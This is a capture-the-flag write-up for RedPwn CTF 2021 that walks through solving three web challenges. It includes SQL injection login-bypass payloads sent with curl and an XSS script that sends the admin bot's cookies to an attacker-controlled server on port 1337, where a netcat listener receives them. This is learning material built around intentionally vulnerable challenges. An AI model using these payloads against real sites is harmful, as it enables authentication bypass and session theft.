# RedPwn CTF 2021 Challenge Writups

## Attempted/Solved Challenges

* web/inspect-me
* web/orm-bad
* web/secure
* web/pastebin-1
* rev/wstrings
* pwn/beginner-generic-pwn-number-0
* pwn/printf-please
* pwn/ret2generi-flag-reader

## Introductory Notes

RedPwnCTF2021 was a short 3 days Jeopardy Style online CTF hosted from 10th July, 2021 to 13th July, 2021. Our team
attempted a few problems in the short time and managed to solve all attempted problems. A detailed breakdown of our
approaches and additional notes we found out later from other writeups are included, along with the challenge files,
prompts and solution codes.

### web/orm-bad

---

#### Categeory: Web

#### Difficulty: Easy

#### Keywords: SQL Injection, Javascript, Sqlite

#### Author: TheRealDarkCoder

#### Prompt:>

```text
I just learned about orms today! They seem kinda difficult to implement though... Guess I'll stick to good old raw sql
statements!

orm-bad.mc.ax

Included Files: web/SOLVED_orm-bad/app.js
```

#### Overview

1. `secure.mc.ax` is a simple http(s) webserver. The source code is provided (`app.js`).

2. The website greets us with an authentication page. 

```html
<!DOCTYPE html>

<html lang="en">

<body>
    <div style="text-align:center">

        <h1>Sign in:</h1>
        <form id="login_form" action="/flag" method="POST">
            <label for="username">Username: </label><input type="text" name="username" id="username"><br>
            <label for="password">Password: </label><input type="password" name="password" id="username"><br>
            <input type="submit" name="submit" id="submit" value="Login">
        </form>
    </div>
</body>
```

1. The `app.js` file is analyzed and we find out the following important attack vector.

```js
app.post('/flag', (req, res) => {
            db.all("SELECT * FROM users WHERE username='" + req.body.username + "' AND password='" + req.body.password + "'", (err, rows) => {
                        try {
                            if (rows.length == 0) {
                                res.redirect("/?alert=" + encodeURIComponent("you are not admin :("));
                            } else if (rows[0].username === "admin") {
                                res.redirect("/?alert=" + encodeURIComponent(flag));
                            } else {
                                ...
```

4. The SQL Query is not sanitized and basic SQL Injection techniques are plausible. Our username has to be `admin`.

5. We pass in the following user inputs:
```
username=admin
password=1' or '1' = '1
```

Here the SQL Query would become 

```sql
"SELECT * FROM users WHERE username='admin' AND password='1' or '1' = '1'"
```

...resulting in a `True` output and giving us authentication to the user. And sure enough, we get an authenticated render of the page and get the flag.

6. A simple curl command can also show the redirect url and get the flag, make sure to url decode the string.

```sh
$ curl -d "username=admin&password=1' or '1'='1" -X POST https://orm-bad.mc.ax/flag

Found. Redirecting to /?alert=flag%7Bsqli_overused_again_0b4f6%7D
#flag{sqli_overused_again_0b4f6}
```

#### Flag: flag{sqli_overused_again_0b4f6}

### web/secure

---

#### Categeory: Web

#### Difficulty: Easy

#### Keywords: SQL Injection, Javascript, Sqlite, Base64, Template Literals

#### Author: TheRealDarkCoder

#### Prompt:>

```
Just learned about encryption—now, my website is unhackable!

secure.mc.ax
```

#### Overview:>

1. Upon visiting the website, we get a similar authentication page as web/orm-bad. A source file is given (`web/SOLVED_secure/index.js`)

```html

  <div class="container">
    <h1>Sign In</h1>
    <form>
      <label for="username">Username</label>
      <input type="text" name="username" id="username" />
      <label for="password">Password</label>
      <input type="password" name="password" id="password" />
      <input type="submit" value="Submit" />
    </form>
    <div class="important"></div>
  </div>
  <script>
    (async() => {
      await new Promise((resolve) => window.addEventListener('load', resolve));
      document.querySelector('form').addEventListener('submit', (e) => {
        e.preventDefault();
        const form = document.createElement('form');
        form.setAttribute('method', 'POST');
        form.setAttribute('action', '/login');

        const username = document.createElement('input');
        username.setAttribute('name', 'username');
        username.setAttribute('value',
          btoa(document.querySelector('#username').value)
        );

        const password = document.createElement('input');
        password.setAttribute('name', 'password');
        password.setAttribute('value',
          btoa(document.querySelector('#password').value)
        );

        form.appendChild(username);
        form.appendChild(password);

        form.setAttribute('style', 'display: none');

        document.body.appendChild(form);
        form.submit();
      });
    })();

  
```

2. We first see an attack vector in database initiation

```javascript
const crypto = require('crypto');
const express = require('express');

const db = require('better-sqlite3')('db.sqlite3');
db.exec(`DROP TABLE IF EXISTS users;`);
db.exec(`CREATE TABLE users(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT
);`);
db.exec(`INSERT INTO users (username, password) VALUES (
    '${btoa('admin')}',
    '${btoa(crypto.randomUUID)}'
)`);
```

We see that depreciated function `btoa()` is used.

3. In the front end client, we see the async function used to submit the form data. We see the snippet

```javascript
username.setAttribute('value',
          btoa(document.querySelector('#username').value)
        );
```

4. The POST data is also converted to base64 using btoa().

5. However, if we analyze the backend code even more, we see the login handling snippet

```javascript
const query = `SELECT id FROM users WHERE
          username = '${req.body.username}' AND
          password = '${req.body.password}';`;
  try {
    const id = db.prepare(query).get()?.id;
```
Here Javascript ES6 Template literals are used to pass in the user data (which is already base64 encoded from client side). But ES6 Template literals won't save one from SQL Injection. So all we have to do is keep the username a base64 encode of `admin` and the password an SQLI payload (`1' or '1'='1'`) like the previous challenge.

6. The following curl post request works just fine
```sh
$ curl -d "username=YWRtaW4=&password=1' or '1' = '1" -X POST https://secure.mc.ax/login

Found. Redirecting to /?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D
#flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}
```

#### Flag: flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}

### web/pastebin-1

---

#### Categeory: Web

#### Difficulty: Medium

#### Keywords: XSS, Cookie Hijacking

#### Author: TheRealDarkCoder

#### Prompt:>

```
Ah, the classic pastebin. Can you get the admin's cookies?

pastebin-1.mc.ax

Admin bot: https://admin-bot.mc.ax/pastebin-1
```

#### Overview:>

1. As the prompt suggests, it is indeed a classic challenge. Upon visiting the website we find a input field which allows us to input any text, and then it stores the text somewhere and gives us a URL which we can use to view the text in the future, hence the name pastebin. The prompt also gives us a link to an admin bot page. The idea is that the admin bot also has a input field which takes the url of any pastebin link. Upon giving the link, the bot visits the link and reads the paste.

2. The backend is written in rust and provided to us (`web/SOLVED_pastebin-1/main.rs`). However I'm very rusty in rust (pun intended) so I decided not to bother with it, and instead try a classic XSS check. So I created a paste with the content 

```js
<script>alert(1)</script>
```

...and sure enough, we have XSS as an alert pops up.

3. On my remote server I open up a port using netcat

```sh
nc -lvpn 1337
```

... *The server is not behind a NAT as it's my test lab so it is publicly accesible. However I would not recommend using your own home computers instead use online services like [hookbin](https://hookbin.com) which gives you a free http endpoint (Thanks to [a writeup here](https://blog.pipeframe.xyz/post/redpwn2021))*
  
4. I create a simple cookie hijacking XSS script which takes the `document.cookie` and submits it as a get request parameter to my server

```html
<script>document.write('<img src="http://XX.XX.XX.XX:1337/?cookie=' + document.cookie + '" />')</script>
```

This XSS script will try to add a image to the DOM. The source of the image is a link to our attacker server where the `document.cookie` is sent along with a GET parameter in the URL. So when the browser (in this case the admin bot) tries to load in the image, it sends a GET request to the image source along with the cookie.

5. We create the paste and pass the link to the admin bot. The admin bot visits the link and we get the following http request at our server

```http
Connection from [REDACTED]:36854
GET /?cookie=flag=flag{d1dn7_n33d_70_b3_1n_ru57} HTTP/1.1
Host: [REDACTED]:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.148 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br

```

6. The cookie is the flag itself, no need to authenticate as admin.

#### Flag: flag{d1dn7_n33d_70_b3_1n_ru57}